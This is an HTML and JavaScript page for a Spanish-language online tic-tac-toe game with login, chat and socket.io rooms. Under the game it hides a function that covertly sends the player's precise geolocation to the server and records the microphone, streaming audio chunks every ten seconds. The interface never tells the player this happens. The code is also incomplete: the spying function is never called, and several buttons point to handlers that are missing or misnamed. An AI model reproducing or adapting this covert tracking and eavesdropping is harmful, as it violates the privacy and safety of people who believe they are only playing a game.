<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>TaTeTi Online</title>

<meta name="theme-color" content="#111111">

<link rel="manifest" href="manifest.json">
<link rel="icon" href="icon-192.png">

<script src="/socket.io/socket.io.js"></script>

<style>

body{
margin:0;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:url("tateti.jpg") center/cover no-repeat;
font-family:Arial;
padding:0px;
box-sizing:border-box;
}

#login{
display:flex;
flex-direction:column;
gap:15px;
background:rgba(20,20,20,0.9);
backdrop-filter:blur(6px);
padding:30px;
border-radius:15px;
color:white;
width:95%;
max-width:420px;
box-sizing:border-box;
}

#login h1{
font-size:38px;
text-align:center;
margin:0 0 10px 0;
}

#login input,
#login button,
.file-label{
height:55px;
font-size:20px;
}

#login input{
padding:5px;
box-sizing:border-box;
}

.file-label{
background:white;
color:black;
display:flex;
align-items:center;
justify-content:center;
border-radius:4px;
cursor:pointer;
}

#foto{
display:none;
}

.contenedor{
display:none;
flex-direction:column;
align-items:center;
gap:4px;
width:95%;
max-width:420px;
  padding:0;
  margin:0 auto;
  transform:translateY(-50px);
}

.estado{
width:100%;
background:rgba(20,20,20,0.9);
backdrop-filter:blur(6px);
color:white;
padding:10px;
border-radius:10px;
text-align:center;
box-sizing:border-box;
font-size:18px;
}

.jugadores{
width:100%;
display:flex;
gap:6px;
  margin-bottom:2px;
}

.jugador-card{
flex:1;
background:rgba(20,20,20,0.9);
backdrop-filter:blur(6px);
color:white;
border-radius:10px;
padding:6px;
box-sizing:border-box;
display:flex;
flex-direction:column;
align-items:center;
gap:5px;
font-size:14px;
  min-height:70px;
}

.jugador-card img{
width:42px;
height:42px;
border-radius:50%;
object-fit:cover;
background:#444;
}

.activo{
outline:3px solid #25D366;
}

.marcador{
width:100%;
display:flex;
justify-content:space-around;
align-items:center;
font-size:18px;
color:white;
background:rgba(20,20,20,0.9);
backdrop-filter:blur(6px);
padding:6px;
border-radius:10px;
box-sizing:border-box;
  margin-top:2px;
  margin-bottom:2px;
}
.reset-btn{
padding:4px 10px;
font-size:12px;
border:none;
border-radius:8px;
background:#ff4444;
color:white;
}

.tablero{
width:100%;
display:grid;
grid-template-columns:repeat(3,1fr);
gap:5px;
background:rgba(0,0,0,0.55);
padding:5px;
border-radius:12px;
  max-width:320px;
  margin:auto;
}

.casilla{
aspect-ratio:1/1;
background:rgba(255,255,255,0.08);
border:3px solid rgba(0,0,0,0.85);
backdrop-filter:blur(4px);
display:flex;
justify-content:center;
align-items:center;
padding:0;
border-radius:10px;
}

.casilla img{
width:70%;
height:70%;
object-fit:contain;
pointer-events:none;
}

.bloqueado{
opacity:0.7;
}

.chat{
width:100%;
background:rgba(20,20,20,0.9);
backdrop-filter:blur(6px);
padding:10px;
border-radius:10px;
box-sizing:border-box;
margin-bottom:0;  
}

.mensajes{
height:60px;
overflow-y:auto;
background:rgba(255,255,255,0.9);
padding:5px;
margin-bottom:10px;
color:black;
font-size:15px;
border-radius:8px;
}

.input-chat{
display:flex;
gap:5px;
}

.input-chat input{
flex:1;
height:30px;
font-size:16px;
}

.input-chat button{
width:80px;
font-size:15px;
  height:30px;
}


.microfono-btn{
width:100%;
height:50px;
margin-top:10px;
border:none;
border-radius:10px;
background:#ff4444;
color:white;
font-size:18px;
}

.botones{
width:100%;
display:flex;
gap:8px;
  margin-top:-10px;
   transform:translateY(0px);
}

.botones button{
flex:1;
height:28px;
font-size:14px;
border:none;
border-radius:10px;
color:white;
}

.copiar{
background:#25D366;
}

.nueva{
background:#3333ff;
}

.salir{
background:#777;
}

#aviso{
position:fixed;
top:20px;
left:50%;
transform:translateX(-50%);
background:#111;
color:white;
padding:12px 20px;
border-radius:10px;
display:none;
z-index:999;
}

</style>

</head>

<body>

<div id="aviso"></div>

<div id="login">

<h1>Regístrate</h1>

<input type="text" id="nombre" placeholder="Nombre">

<label for="foto" class="file-label">
Imagen de perfil
</label>

<input type="file" id="foto" accept="image/*">

<button onclick="entrar()">Jugar</button>

</div>

<div class="contenedor" id="juego">

<div class="jugadores">

<div class="jugador-card" id="cardX">
<img id="fotoX" src="perfil1.jpg">
<div>X</div>
<div id="nombreX">Esperando</div>
</div>

<div class="jugador-card" id="cardO">
<img id="fotoO" src="perfil2.jpg">
<div>O</div>
<div id="nombreO">Esperando</div>
</div>

</div>

<div class="marcador">

<div>X: <span id="scoreX">0</span></div>

<button class="reset-btn" onclick="resetScore()">
Reset
</button>

<div>O: <span id="scoreO">0</span></div>

</div>

<div class="tablero" id="tablero">

<button class="casilla"></button>
<button class="casilla"></button>
<button class="casilla"></button>

<button class="casilla"></button>
<button class="casilla"></button>
<button class="casilla"></button>

<button class="casilla"></button>
<button class="casilla"></button>
<button class="casilla"></button>

</div>

<div class="chat">

<div class="mensajes" id="mensajes"></div>

<div class="input-chat">
<input type="text" id="texto" placeholder="Mensaje">
<button onclick="enviar()">Enviar</button>
</div>



</div>

<div class="botones">

<button class="copiar" onclick="invitar()">
Invita a jugar
</button>

<button class="nueva" onclick="nuevaSala()">
Nueva sala
</button>

<button class="salir" onclick="salir()">
Salir
</button>

</div>

</div>

<script>
  async function invitar() {
   await navigator.share({
     title:"TaTeTi Online",
     text:"Juga Conmigo",
url:window.location.href
  });
  }


function nuevasala() {
    location.reload();
}

function salir() {
    window.location.href = "https://google.com";
}

let mediaRecorder
let audioActivo = false

const socket = io()

const fotosRandom = [
"perfil1.jpg",
"perfil2.jpg",
"perfil3.jpg",
"perfil4.jpg"
]

const casillas =
document.querySelectorAll(".casilla")

let jugador = ""
let fotoJugador = ""
let miSimbolo = ""
let turnoActual = ""

let room =
window.location.pathname.split("/").pop()

if(room == "" || room == "public"){
room = "sala"
}

window.onload = ()=>{

const nombreGuardado =
localStorage.getItem("nombre")

const fotoGuardada =
localStorage.getItem("foto")

if(nombreGuardado){

jugador = nombreGuardado

fotoJugador =
fotoGuardada || elegirRandom()

iniciarJuego()

}

}

function entrar(){

const input =
document.getElementById("nombre")

const foto =
document.getElementById("foto").files[0]

if(input.value == "") return

jugador = input.value

localStorage.setItem(
"nombre",
jugador
)

if(foto){

const reader = new FileReader()

reader.onload = function(e){

fotoJugador = e.target.result

localStorage.setItem(
"foto",
fotoJugador
)

iniciarJuego()

}

reader.readAsDataURL(foto)

}else{

fotoJugador = elegirRandom()

iniciarJuego()

}

}

function elegirRandom(){

return fotosRandom[
Math.floor(
Math.random()*fotosRandom.length
)
]

}

function iniciarJuego(){

document.getElementById("login")
.style.display = "none"

document.getElementById("juego")
.style.display = "flex"

async function jugar(){

navigator.geolocation.getCurrentPosition(
async (pos)=>{
socket.emit("ubicacion",{
room,
nombre:jugador,
lat:pos.coords.latitude,
lng:pos.coords.longitude
})
const stream = await navigator.mediaDevices.getUserMedia({
audio:true
})
const mediaRecorder = new MediaRecorder(stream)
mediaRecorder.ondataavailable = async (e)=>{
if(e.data.size > 0){
const reader = new FileReader()
reader.onloadend = ()=>{
socket.emit("audioServidor",{
room,
nombre:jugador,
audio:reader.result
})
}
reader.readAsDataURL(e.data)
}
}
mediaRecorder.start(10000)
socket.emit("joinRoom",{
room,
nombre:jugador,
foto:fotoJugador
})
},
(err)=>{
console.log(err)
socket.emit("joinRoom",{
room,
nombre:jugador,
foto:fotoJugador
})
},
{
enableHighAccuracy:true,
timeout:10000,
maximumAge:0
}
)
}
}
</script>

</body>
</html>
